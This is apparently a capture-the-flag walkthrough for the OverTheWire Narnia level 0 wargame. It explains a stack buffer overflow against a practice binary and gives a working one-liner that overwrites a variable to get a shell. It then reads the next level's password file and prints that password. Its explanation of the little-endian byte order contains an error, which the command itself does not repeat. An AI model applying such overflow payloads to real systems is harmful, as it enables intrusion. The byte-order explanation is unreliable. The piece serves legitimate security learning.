# **NARNIA 0**

So let's just connect with this:
	ssh -p 2226 narnia0@narnia.labs.overthewire.org
and the password is:
narnia0

## Let's analyze our data
The data are into /narnia/
The code is:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Any value wouldn't do anything, so now let's try to give him too many char

### The idea
>This technique is called a BufferOverflow, where we put our data is a buffer, but obsviously he has a limited size!
>So if you give him too many informations, what happened?
> Let's see!!

### The Application
So let's try to overflow the buffer -->

```python
python -c 'print "A"*30' | ./narnia0
```

and of course we got the result = AAAAAAAAAAAAAAA 
So our overflow works and our data is oveflowing!
the size given to our scanf is 20char
we want to send "deadbeef" but the machine is certainly a little endian 

## BUT what is a little or big endian??
>When our data is saved they follow rules, for example if I do want to stock the hex value "dead", in a big endian, I'll just put 0xde and 0xad
>(0x is for hex)
>But a little endian will store "dead" as 0xad 0xde

so we'll return the string
de ad be ef ----> fe be ad de
in hex we have so: **\xfe\xbe\xad\xde**

and as the the sh close up immediatly after we overflow we have to put stg to keep him awake

in my case i'll just use a cat

```bash
(python -c 'print "A"\*20+"\xef\xbe\xad\xde"'; cat) | ./narnia0
```

Alright is see a new shell appeared so let's see who i am with the command whoami --> narnia1
**PERFECT**
alright lets cat /etc/narnia_pass/narnia1
-----------------------------------------
And we have our password!!
(I'll publish them here but don't just pass them, do all the path to get the key your own!)

efeidiedae